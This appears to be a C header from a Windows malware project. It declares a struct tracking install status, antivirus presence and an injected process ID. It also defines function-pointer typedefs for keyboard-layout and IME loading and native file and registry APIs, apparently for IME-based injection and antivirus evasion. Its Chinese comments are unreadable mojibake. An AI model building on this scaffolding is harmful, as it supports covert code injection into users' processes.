////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include <windows.h>
#include <Tlhelp32.h>
#include <shlwapi.h>
#include <Ntsecapi.h>
#include <Aclapi.h>
#include <Psapi.h>
#include "resource.h"


//����ͨ��


//һЩ�����ڲ������ȫ����Ϣ
typedef	struct	__ENVIRINFO{

	OSVERSIONINFOEX	OSVerInfo;
	char			szExePath[MAX_PATH];
	
	DWORD			dwInstallFlag;	//bit1: 1=פ���������,0=������;
	DWORD			dwAntiVirus;
	DWORD			dwInjectProcessId;

	HKL				hMyHkl;
	char			szIMEName[32];
	
}ENVIRINFO;

//����������д���û����ò���
//��С: ? �ֽ�
#pragma pack(4)
typedef	struct	_GLOBALPARAMETER{

	char	cVersionInfo[16];	//���ڸ���ģ��ľ������ܵİ汾��

}GLOBALPARAMETER, *PGLOBALPARAMETER;
#pragma pack()


extern	GLOBALPARAMETER		*g_pGlobalParameter;

//void	WriteLog(char *pText, DWORD dwSize);

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ��������(ֻ����ɱ��) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
#define	__in_out

typedef	long (WINAPI *DEF_BroadcastSystemMessage)(
    __in DWORD flags,
    __inout_opt LPDWORD lpInfo,
    __in UINT Msg,
    __in WPARAM wParam,
    __in LPARAM lParam
	);
typedef	HKL (WINAPI *DEF_LoadKeyboardLayout)(
    __in LPCSTR pwszKLID,
    __in UINT Flags
	);
typedef	BOOL (WINAPI *DEF_UnloadKeyboardLayout)(
    __in HKL hkl
	);
typedef	BOOL (__stdcall	*DEF_ImmLoadLayout)(
	HKL hKL, 
	/*PIMEINFOEX*/void *piiex
	);
typedef	NTSTATUS (*DEF_ZwQueryValueKey)(
    IN HANDLE  KeyHandle,
    IN PUNICODE_STRING  ValueName,
    IN /*KEY_VALUE_INFORMATION_CLASS*/DWORD  KeyValueInformationClass,
    OUT PVOID  KeyValueInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
    );

//--------------------- ZwCreateFile -----------------------//
typedef struct _OBJECT_ATTRIBUTES {
    ULONG  Length;
    HANDLE  RootDirectory;
    PUNICODE_STRING  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef	LONG (NTAPI *DEF_ZwCreateFile)(
	OUT PHANDLE  FileHandle,
	IN ACCESS_MASK  DesiredAccess,
	IN POBJECT_ATTRIBUTES  ObjectAttributes,
	OUT PIO_STATUS_BLOCK  IoStatusBlock,
	IN PLARGE_INTEGER  AllocationSize  OPTIONAL,
	IN ULONG  FileAttributes,
	IN ULONG  ShareAccess,
	IN ULONG  CreateDisposition,
	IN ULONG  CreateOptions,
	IN PVOID  EaBuffer  OPTIONAL,
	IN ULONG  EaLength
);
//-----------------------------------------------------------//

typedef	int (__cdecl *DEF_wsprintf)(
	LPTSTR lpOut,
    LPCTSTR lpFmt,
     ...
);

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>